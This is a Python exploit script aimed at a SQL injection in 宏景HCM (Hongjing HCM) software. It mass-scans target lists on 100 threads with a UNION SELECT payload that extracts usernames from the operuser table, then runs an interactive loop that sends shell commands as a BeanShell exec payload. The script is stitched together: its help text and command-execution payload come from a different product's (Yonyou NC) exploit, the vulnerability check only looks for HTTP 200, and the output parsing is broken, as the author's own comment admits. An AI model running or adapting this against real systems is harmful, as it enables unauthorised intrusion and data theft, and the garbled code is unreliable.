# 宏景HCM SQL注入漏洞
import re,requests,argparse,sys,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 解除警告
def banner():
    test = """   _____ _   ___      _______       ___   ___ ___  ____         ___   ___ ______ _  _  ____  
  / ____| \ | \ \    / /  __ \     |__ \ / _ \__ \|___ \       / _ \ / _ \____  | || ||___ \ 
 | |    |  \| |\ \  / /| |  | |______ ) | | | | ) | __) |_____| | | | (_) |  / /| || |_ __) |
 | |    | . ` | \ \/ / | |  | |______/ /| | | |/ / |__ <______| | | |> _ <  / / |__   _|__ < 
 | |____| |\  |  \  /  | |__| |     / /_| |_| / /_ ___) |     | |_| | (_) |/ /     | | ___) |
  \_____|_| \_|   \/   |_____/     |____|\___/____|____/       \___/ \___//_/      |_||____/ 
                                                                                                                           
                                                                                version:1.0.7            
                                                                                author:guoguo12138                  
"""
    print(test)

def main():
    banner()
    # 处理命令行参数了
    parser = argparse.ArgumentParser(description="用友nc命令执行poc&exp")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')

    args = parser.parse_args()

    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"\n\tUage:python {sys.argv[0]} -h")
                

def poc(target):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1",
    }
    payload_url = '/servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20all~20select~20~27~31~27~2cusername~20from~20operuser~20~2d~2d'
    url = target+payload_url
    try:
        # res = requests.get(url=url)
            res2 = requests.post(url=url,headers=headers)
            if res2.status_code == 200:
            # match = re.search(r'<pre>(.*?)</pre>',res2.text,re.S)
            # print(match.group(1))
            # if 'SIS2402' in match.group(1): #注意不可以用 == 。
                print(f"[+该url存在漏洞{target}")
                with open('hongjing.txt','a',encoding='utf-8') as fp:
                    fp.write(target+"\n")
                    return True
            else:
                print(f"该url不存在漏洞{target}")
                return False
    except Exception as e:
        print(f"该url存在问题{target}"+e)
        return False

def exp(target):
    print("--------------正在进行漏洞利用------------")
    time.sleep(2)
    while True:
        cmd = input('请输入你要执行的命令>')
        if cmd == 'q':
            print("正在退出，请等候....")
            break
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close",
            "Upgrade-Insecure-Requests": "1",
        }            
        data = f'bsh.script=exec("{cmd}")'
        res = requests.post(url=target+'/servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20all~20select~20~27~31~27~2cusername~20from~20operuser~20~2d~2d',headers=headers,data=data)
        #此处有错误
        # match = re.search(r'<pre>(.*?)</pre>',res.text,re.S)
        match = re.findall(r'\broot\b', res.text)
        print(match.group(1).strip())
if __name__ == '__main__':
    main()
